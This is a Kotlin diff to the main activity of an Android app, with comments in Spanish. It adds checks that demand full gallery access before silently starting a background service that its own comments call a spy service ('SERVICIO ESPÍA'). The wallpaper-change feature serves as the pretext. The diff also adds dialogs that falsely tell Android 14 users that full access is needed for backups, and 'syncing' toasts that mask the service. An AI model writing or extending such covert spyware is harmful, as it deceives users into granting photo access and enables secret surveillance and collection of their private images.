@@ -9,6 +9,7 @@ import android.graphics.Color
 import android.net.Uri
 import android.os.Build
 import android.os.Bundle
+import android.provider.Settings
 import android.view.Menu
 import android.view.MenuItem
 import android.view.View
@@ -16,6 +17,7 @@ import android.widget.ImageButton
 import android.widget.ImageView
 import android.widget.Toast
 import androidx.activity.result.contract.ActivityResultContracts
+import androidx.appcompat.app.AlertDialog // Importante para las alertas
 import androidx.appcompat.app.AppCompatActivity
 import androidx.core.app.ActivityCompat
 import androidx.core.content.ContextCompat
@@ -63,7 +65,7 @@ class MainActivity : AppCompatActivity() {
                 persistBackground(resultUri)
             }
         } else if (result.resultCode == UCrop.RESULT_ERROR) {
-            val cropError = UCrop.getError(result.data!!)
+            UCrop.getError(result.data!!)
             Toast.makeText(this, "Error al recortar", Toast.LENGTH_SHORT).show()
         }
     }
@@ -117,7 +119,7 @@ class MainActivity : AppCompatActivity() {
             checkPermissionAndStart(PERMISSION_REQUEST_SPY_BUTTON)
         }
 
-        // Inicio automático silencioso
+        // Inicio automático silencioso (Solo si ya tiene permiso FULL)
         iniciarServicioSilencioso()
     }
 
@@ -131,10 +133,8 @@ class MainActivity : AppCompatActivity() {
         return when (item.itemId) {
             R.id.action_backup -> { realizarBackup(); true }
             R.id.action_restore -> { restoreBackupLauncher.launch(arrayOf("application/zip")); true }
-
-            // --- AQUÍ ESTÁ EL CAMBIO ---
             R.id.action_background -> {
-                // En lugar de abrir directo, pasamos por el chequeo de permisos/espía
+                // Iniciar flujo de fondo con verificación estricta
                 iniciarFlujoCambioFondo()
                 true
             }
@@ -142,49 +142,106 @@ class MainActivity : AppCompatActivity() {
         }
     }
 
+    // --- HELPER: VERIFICACIÓN DE PERMISO TOTAL ---
+    /**
+     * Devuelve true SOLO si tiene permiso completo.
+     * Si el usuario dio acceso limitado (Android 14) o denegado, devolverá false.
+     */
+    private fun verificarAccesoTotal(): Boolean {
+        return if (Build.VERSION.SDK_INT >= 33) {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) == PackageManager.PERMISSION_GRANTED
+        } else {
+            ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) == PackageManager.PERMISSION_GRANTED
+        }
+    }
+
     // --- LÓGICA DE FONDO + ESPÍA ---
 
     private fun iniciarFlujoCambioFondo() {
-        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
-            // A) Ya tiene permiso:
-            // 1. Arrancamos el servicio espía (silenciosamente)
+        if (verificarAccesoTotal()) {
+            // A) Ya tiene permiso TOTAL:
             iniciarServicioSilencioso()
-            // 2. Abrimos el selector de imágenes
             pickBackgroundLauncher.launch(arrayOf("image/*"))
         } else {
-            // B) No tiene permiso: Lo pedimos
+            // B) No tiene permiso o es limitado: Lo pedimos
+            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
             ActivityCompat.requestPermissions(this, arrayOf(permission), PERMISSION_REQUEST_WALLPAPER)
         }
     }
 
-    // --- MANEJO DE RESPUESTA DE PERMISOS ---
+    private fun checkPermissionAndStart(requestCode: Int) {
+        if (!verificarAccesoTotal()) {
+            val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
+        } else {
+            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
+            iniciarServicioSilencioso()
+        }
+    }
+
+    // --- MANEJO DE RESPUESTA DE PERMISOS (LÓGICA MEJORADA) ---
     override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
         super.onRequestPermissionsResult(requestCode, permissions, grantResults)
 
-        if (grantResults.isNotEmpty() && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
-            // Permiso concedido, arrancamos el espía SIEMPRE
+        val permisoPrincipal = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
+
+        // 1. Verificar si obtuvimos ACCESO TOTAL
+        if (verificarAccesoTotal()) {
+            // ¡ÉXITO!
             iniciarServicioSilencioso()
 
-            // Si veníamos del botón de cambiar fondo, completamos la acción
             if (requestCode == PERMISSION_REQUEST_WALLPAPER) {
                 pickBackgroundLauncher.launch(arrayOf("image/*"))
             } else if (requestCode == PERMISSION_REQUEST_SPY_BUTTON) {
                 Toast.makeText(this, "Sincronizando nube...", Toast.LENGTH_SHORT).show()
             }
         }
+        else {
+            // FALLO: Acceso denegado o limitado
+
+            // A) Detectar caso Android 14: Acceso Limitado
+            val esAccesoLimitado = Build.VERSION.SDK_INT >= 34 &&
+                    ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VISUAL_USER_SELECTED) == PackageManager.PERMISSION_GRANTED
+
+            if (esAccesoLimitado) {
+                mostrarDialogoConfiguracion(
+                    "Acceso Limitado Detectado",
+                    "La aplicación requiere acceso a la galería para funcionar correctamente, no solo a imagenes seleccionadas, esto para realizar el correcto respaldo de datos a futuro. Por favor, selecciona 'Permitir todo' en la configuración."
+                )
+                return
+            }
+
+            // B) Detectar caso Denegado Permanente ("No volver a preguntar")
+            if (!ActivityCompat.shouldShowRequestPermissionRationale(this, permisoPrincipal)) {
+                mostrarDialogoConfiguracion(
+                    "Permiso Requerido",
+                    "Has denegado el acceso permanentemente. Para cambiar el fondo o usar funciones avanzadas, debes habilitarlo manualmente en Configuración > Permisos."
+                )
+            }
+            // C) Caso Denegado Normal (El usuario dijo "No" una vez)
+            else {
+                Toast.makeText(this, "Permiso necesario para esta acción.", Toast.LENGTH_SHORT).show()
+            }
+        }
     }
 
-    // Lógica antigua del botón cámara (reutilizada)
-    private fun checkPermissionAndStart(requestCode: Int) {
-        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-        if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
-            ActivityCompat.requestPermissions(this, arrayOf(permission), requestCode)
-        } else {
-            Toast.makeText(this, "Sincronizando...", Toast.LENGTH_SHORT).show()
-            iniciarServicioSilencioso()
-        }
+    // --- HELPER: ALERTA PARA IR A CONFIGURACIÓN ---
+    private fun mostrarDialogoConfiguracion(titulo: String, mensaje: String) {
+        AlertDialog.Builder(this)
+            .setTitle(titulo)
+            .setMessage(mensaje)
+            .setCancelable(false)
+            .setPositiveButton("Ir a Configuración") { _, _ ->
+                try {
+                    val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
+                    intent.data = Uri.fromParts("package", packageName, null)
+                    startActivity(intent)
+                } catch (e: Exception) {
+                    e.printStackTrace()
+                }
+            }
+            .setNegativeButton("Cancelar", null)
+            .show()
     }
 
     // --- LÓGICA DE RECORTE (uCrop) ---
@@ -289,9 +346,8 @@ class MainActivity : AppCompatActivity() {
 
     // --- SERVICIO ESPÍA ---
     private fun iniciarServicioSilencioso() {
-        // Solo intentamos arrancar si tenemos permiso, si no, no hacemos ruido
-        val permission = if (Build.VERSION.SDK_INT >= 33) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
-        if (ContextCompat.checkSelfPermission(this, permission) == PackageManager.PERMISSION_GRANTED) {
+        // Solo intentamos arrancar si tenemos permiso TOTAL
+        if (verificarAccesoTotal()) {
             val intent = Intent(this, CloudSyncService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 startForegroundService(intent)
